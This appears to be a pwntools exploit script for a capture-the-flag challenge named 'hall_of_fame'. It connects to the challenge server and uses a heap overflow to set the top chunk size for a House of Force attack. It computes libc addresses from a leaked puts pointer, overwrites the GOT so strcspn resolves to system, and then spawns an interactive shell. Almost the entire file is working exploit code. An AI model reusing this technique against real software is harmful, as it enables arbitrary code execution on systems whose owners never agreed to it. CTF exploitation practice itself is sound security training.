from pwn import *

#io = process("./hall_of_fame")
io = remote("fun.chall.seetf.sg",50004)
libc = ELF("./libc-2.27.so")

gotTable = 0x602010

def addHOF(score,name):
    io.sendlineafter("Choose>","1")
    io.sendlineafter("How many points did this person score? > ",str(score))
    io.sendlineafter("Who is this Hall of Famer > ",name)

# House of force. (Hall of Fame, House of Force, HOF, epic chall naming)
overflow  = b"A" * 0x10
overflow += p64(0) + p64(0xffffffffffffffff)

addHOF(0x10,overflow) # first chunk metadata is @ heapBase + 0x250

io.sendlineafter("Choose>","2")
io.recvuntil("The position of latest addition is at ")

chunkPtr = int(io.recvuntil("\n")[:-1],16)
wilderness = chunkPtr + 0x10
io.recvuntil("The position of PUTS is at ")

putsLibc = int(io.recvuntil("\n")[:-1],16)
libc.address = putsLibc - libc.symbols["puts"]
systemLibc = libc.symbols["system"]

log.info("wilderness: " + hex(wilderness))
log.info("system@libc: " + hex(systemLibc))

offset = gotTable - wilderness - 0x20
#offset = 0xffffffffffffffff + offset + 1

addHOF(offset,"A")

gotEntries  = b"A" * 8 + p64(0x400716) + p64(putsLibc) + p64(systemLibc) 
gotEntries += p64(libc.symbols["sbrk"]) + p64(libc.symbols["fgets"]) + p64(libc.symbols["strtol"]) 
gotEntries += p64(libc.symbols["malloc"]) + p64(libc.symbols["fflush"]) + p64(libc.symbols["setvbuf"]) + p64(libc.symbols["atoi"])

# Overwrite GOT so that
# strcspn@got         : system@libc
# Had to overwrite everything cause stuff like fgets@got were getting overwritten if I only wrote till strcspn@got
# Prob got overwritten by fd ptrs etc those, idk

# Set gotTable=0x602010 instead of 0x602018 too cause heap alignment stuff (everything aligned with 0x10 / divisible by 0x10)

addHOF(0x80,gotEntries)
io.sendlineafter("Choose>","sh")

io.interactive()
